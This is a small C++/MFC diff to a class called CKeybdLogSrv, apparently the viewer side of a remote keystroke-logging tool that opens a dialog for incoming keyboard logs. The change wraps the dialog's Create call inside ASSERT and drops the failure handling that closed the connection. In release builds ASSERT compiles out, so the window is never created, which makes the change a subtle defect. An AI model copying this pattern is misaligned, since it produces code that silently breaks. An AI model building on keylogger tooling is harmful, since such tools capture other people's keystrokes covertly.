@@ -24,17 +24,15 @@ void CKeybdLogSrv::OnClose(){
 			// pHandler先关闭的,那么就不管窗口了
 			m_pDlg->m_pHandler = nullptr;
 			m_pDlg->PostMessage(WM_KEYBD_LOG_ERROR, (WPARAM)TEXT("Disconnect."));
-			m_pDlg = nullptr;
 		}
+		m_pDlg = nullptr;
 	}
 }
 
 void CKeybdLogSrv::OnOpen(){
 	m_pDlg = new CKeybdLogDlg(this);
-	if (FALSE == m_pDlg->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow())){
-		Close();
-		return;
-	}
+	ASSERT(m_pDlg->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow()));
+
 	m_pDlg->ShowWindow(SW_SHOW);
 }
 
